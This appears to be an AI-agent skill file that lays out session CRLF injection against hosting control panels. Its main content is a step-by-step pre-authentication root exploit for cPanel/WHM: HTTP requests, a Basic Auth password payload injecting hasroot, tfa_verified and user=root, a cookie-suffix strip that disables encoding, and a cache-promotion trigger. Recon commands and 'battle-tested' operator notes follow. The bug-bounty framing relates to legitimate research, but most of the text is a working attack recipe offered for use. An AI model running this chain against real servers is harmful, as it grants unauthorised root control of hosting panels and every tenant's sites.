---
name: session-crlf-injection
description: "Inject CRLF into flat-file session storage on hosting control panels to forge session attributes and reach pre-auth root access — cPanel/WHM, Plesk, DirectAdmin. Use when the target is a hosting control panel, or any PHP application writing user-controlled values into file-based sessions."
---

# Session Storage CRLF Injection & Flat-File Session Attacks

## Crown Jewel Targets

- cPanel/WHM (70M+ domains worldwide, pre-auth root WHM access)
- Plesk hosting panels with flat-file session storage
- DirectAdmin and other hosting control panels
- Legacy PHP applications with file-based sessions (`/tmp/sess_*`)
- Embedded devices with text-based configuration/session files
- Custom session implementations using line-delimited key=value format

## Attack Surface Signals

- Hosting panel ports: 2087 (WHM), 2083 (cPanel), 8443 (Plesk), 2222 (DirectAdmin)
- Session files: `/var/cpanel/sessions/`, `/tmp/sess_*`, `/var/lib/php/sessions/`
- cPanel indicators: `cpsession=` cookie, `/login/?login_only=1` endpoint
- Basic Auth or login forms where password value is stored in session
- Dual-format storage (raw text + JSON cache)

**Source:** WatchTowr Labs (cPanel, 2026), general research
**CVEs:** CVE-2026-41940
**Affected:** cPanel/WHM (70M+ domains), any application using line-oriented flat-file session storage

## Overview

When session data is stored in line-oriented flat files (one key=value pair per line), CRLF characters injected through user-controlled input can create arbitrary new key=value pairs in the session. This allows an attacker to inject authentication flags, escalate privileges, and bypass password verification entirely. The cPanel exploitation chain demonstrates how this class of vulnerability can grant root-level WHM access without knowing any password, affecting over 70 million domains worldwide.

## Technical Details

### Core Vulnerability Mechanism

Flat-file session storage writes session variables as newline-delimited key=value pairs:
```
user=john
authenticated=0
role=user
last_login=1716825600
```

If any value written to this file contains `\r\n` (CRLF), the attacker can inject new lines:
```
password=evil\r\nhasroot=1\r\nauthenticated=1\r\nuser=root
```

The session file becomes:
```
user=john
password=evil
hasroot=1
authenticated=1
user=root
last_login=1716825600
```

Later reads parse the last (or first, depending on implementation) occurrence of each key, granting the attacker arbitrary session state.

### cPanel Exploitation Chain (CVE-2026-41940)

Full pre-auth to root WHM access chain affecting 70M+ domains:

**Step 1: Obtain Pre-Auth Session Cookie**
```http
GET /login/?login_only=1 HTTP/1.1
Host: target:2087
```
Response provides a session cookie with format: `cpsession=TOKEN,<ob_hex>`

**Step 2: Strip Cookie Suffix to Disable Password Encoding**
The `,<ob_hex>` suffix in the cookie triggers server-side obfuscation of the password value before writing to the session file. By stripping this suffix, the raw password value (including CRLF) is written directly:
```
Cookie: cpsession=TOKEN
# (removed the ,<ob_hex> portion)
```
This is the critical insight: omitting an optional client-side parameter disables a server-side security mechanism.

**Step 3: Inject Session Variables via Basic Auth Password**
```http
GET /login/?login_only=1 HTTP/1.1
Host: target:2087
Authorization: Basic BASE64(user:\r\nhasroot=1\r\ntfa_verified=1\r\nuser=root\r\nsuccessful_internal_auth_with_timestamp=1716825600)
Cookie: cpsession=TOKEN
```
The password field in Basic Auth is written to the session file. With encoding disabled (step 2), the CRLF characters create new session entries.

**Injected session variables:**
- `hasroot=1` -- Grants root privileges in WHM
- `tfa_verified=1` -- Bypasses two-factor authentication
- `user=root` -- Sets session user to root
- `successful_internal_auth_with_timestamp=...` -- Skips `/etc/shadow` password validation entirely

**Step 4: Trigger Raw-to-Cache Promotion**
cPanel uses dual-format session storage:
- **Raw format:** Line-oriented text file (where injection happens)
- **Cache format:** JSON file (what the application actually reads)

Normally the cache is authoritative. To force the application to re-read the raw file and promote it to cache:
```http
GET /cpsess-TOKEN/execute/some_endpoint HTTP/1.1
Cookie: cpsession=TOKEN
# Request without valid security token triggers error handler
# Error handler re-reads raw session file → writes to JSON cache
# Injected values now in the authoritative cache
```

**Step 5: Full Root WHM Access**
```http
GET /cpsess-TOKEN/whm/index.html HTTP/1.1
Cookie: cpsession=TOKEN
```
The session now contains `hasroot=1`, `user=root`, and `successful_internal_auth_with_timestamp`. The application grants full root WHM access without ever validating a password against `/etc/shadow`.

### Password Check Bypass Detail

The presence of `successful_internal_auth_with_timestamp` in the session causes cPanel to skip its normal authentication flow entirely. The code path checks:
```perl
if (exists $session->{successful_internal_auth_with_timestamp}) {
    # Already authenticated internally, skip password check
    return 1;
}
# Normal password validation against /etc/shadow
```

### Dual-Format Storage Vulnerability

The raw-to-cache promotion is a critical amplification step. Raw file (text) is vulnerable to CRLF but not directly read during normal operation. Cache file (JSON) is authoritative but not directly injectable. Error conditions trigger re-parsing of the raw file into the cache, promoting injected text lines into legitimate JSON entries. This dual-format pattern is common in systems that evolved from text storage to structured formats while maintaining backward compatibility.

## Detection Indicators

```bash
# Identify flat-file session storage
find /tmp /var/lib/php/sessions /var/cpanel -name "sess_*" -o -name "session_*" 2>/dev/null
ls -la /var/cpanel/sessions/raw/ 2>/dev/null

# Check cPanel version
curl -sk https://target:2087/login/ | grep -o 'cPanel.*[0-9]\+\.[0-9]\+'

# Test for CRLF in session values (safe)
# Send username/password with %0d%0a and check if session file grows unexpectedly

# Hosting panel detection
curl -s -D- https://target:2087/ | grep -i "cpanel\|whm\|webhost\|plesk\|directadmin"
curl -s -D- https://target:2083/ | grep -i "cpanel"
```

## Testing Methodology

1. **Identify session storage mechanism:** Check if sessions are stored in files (flat text), database, or memory. File-based sessions on shared hosting are most vulnerable
2. **Determine session file format:** Are entries line-delimited? Key=value? JSON? XML? Line-delimited formats are vulnerable to CRLF
3. **Test CRLF in all session-stored values:** Username, password, custom fields, language preference, any user-controllable value that persists in the session
4. **Test with partial/malformed session cookies:** Strip optional suffixes, modify cookie components, observe which server-side behaviors change
5. **Check for dual-format storage:** Does the application maintain both raw and processed session representations? Can you trigger re-parsing?
6. **Test password encoding bypass:** Omit client-side parameters that trigger server-side encoding/obfuscation
7. **Verify privilege escalation:** After injection, check if admin flags (`hasroot`, `is_admin`, `role=admin`) are honored
8. **Check 2FA bypass:** Can `tfa_verified` or similar flags be injected to skip second-factor verification?

## Related Patterns

- **HTTP Header Injection:** CRLF in HTTP headers to inject new headers or split responses
- **Log Injection:** CRLF in log entries to forge log lines or inject commands
- **Email Header Injection:** CRLF in email headers to add BCC recipients or modify sender
- **Redis CRLF Protocol Injection:** CRLF in Redis commands via SSRF to execute arbitrary operations

## Bug Bounty Relevance

- **CRITICAL**: Hosting panels (cPanel, Plesk, DirectAdmin) are extremely high-value targets due to multi-tenant impact
- **CRITICAL**: Pre-auth to root access without any credential knowledge
- **CRITICAL**: 70M+ domains affected by the cPanel variant alone
- Hosting panels, embedded devices, and legacy web applications most commonly use flat-file sessions
- The dual-format storage pattern (raw + cache) is an overlooked amplification vector
- Low duplicate risk because the vulnerability class is poorly understood by most researchers
- Modern frameworks (Django, Rails, Laravel) use signed/encrypted cookie sessions or database storage, making them less susceptible -- focus on older/custom session implementations

## Operator Notes (Battle-Tested)

- **Strip optional cookie suffixes**: The cPanel attack works because stripping the `,<ob_hex>` suffix from the session cookie disables server-side password obfuscation. Always test with modified/partial cookies.
- **Dual-format storage is the amplifier**: Raw file is injectable, JSON cache is authoritative. Error conditions trigger re-parsing of raw file into cache. Find the error trigger to promote injected values.
- **Inject in ALL session-stored fields**: Username, password, language, timezone, custom fields. Any user-controllable value that persists in the session file is a potential injection point.
- **`hasroot=1` + `tfa_verified=1` + `user=root`**: These three injected session variables give full root WHM access on cPanel. The `successful_internal_auth_with_timestamp` flag skips `/etc/shadow` validation entirely.
- **Modern frameworks are NOT vulnerable**: Django, Rails, Laravel use signed/encrypted cookie sessions or database storage. Focus on hosting panels, embedded devices, and legacy custom implementations.
- **CRLF in Basic Auth password field**: The password in `Authorization: Basic BASE64(user:password)` is written to the session file. Inject `\r\n` in the password for session variable injection.

## Related Skills & Chains

| Pattern | Chain Potential |
|---------|---------------|
| `crlf-injection` | General CRLF injection techniques |
| `auth-bypass-testing` | Auth bypass methodology |
| `appliance-management-attacks` | Hosting panel attack surface |
| `execution-after-redirect` | EAR on hosting panel admin pages |
| `host-header-attacks` | Host header manipulation on panels |
